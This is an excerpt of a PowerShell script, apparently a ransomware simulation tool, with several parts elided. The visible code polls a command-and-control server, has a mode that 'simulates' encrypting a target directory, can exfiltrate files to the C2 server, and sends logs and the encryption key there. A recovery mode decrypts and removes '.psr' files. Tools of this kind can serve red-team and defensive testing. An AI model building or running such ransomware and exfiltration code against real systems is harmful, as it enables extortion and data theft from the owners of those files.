...
if ($args[0] -eq $null) { Show-Banner ; Show-Help ; "[!] Not enough parameters!" ; break }
if ($args[1] -eq $null) { Show-Banner ; Show-Help ; "[!] Not enough parameters!" ; break }
if ($args[2] -eq $null) { Show-Banner ; Show-Help ; "[!] Not enough parameters!" ; break }
if ($args[3] -eq $null) { Show-Banner ; Show-Help ; "[!] Not enough parameters!" ; break }
...
function GetStatus {
   Try { Invoke-WebRequest -useb "$C2Server`:$C2Port/status" -Method GET
      "[+] Command & Control Server is up!" }
   Catch { "[!] Command & Control Server is down!" }}
...
function DecryptFiles {
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      ...
      "[+] $rfile is now decrypted" } ; Remove-Item "$Directory$slash$Readme" }

function CheckFiles {
   $RFiles = Get-ChildItem $Directory -recurse -filter *.psr ; if ($RFiles) { $RFiles | Remove-Item } else {
   "[!] No encrypted files has been found!" }}

# Main
Show-Banner ; ShowInfo

if ($Mode -eq "-d") {
   "[*] Recovering ransomware infection on $DirectoryTarget directory.."
   "[*] Applying recovery key on encrypted files.."
   DecryptFiles ; CheckFiles ; sleep 1 }

else {
   "[*] Simulating ransomware infection on $DirectoryTarget directory.."
   ...
   if ($Exfil -eq "-x") { "[*] Exfiltrating files to Command & Control Server.."
      ExfiltrateFiles ; sleep 1 }}

   if (!$C2Status) { "[+] Saving logs and key in readme.txt.."}
   else { "[*] Sending logs and key to Command & Control Server.."}}
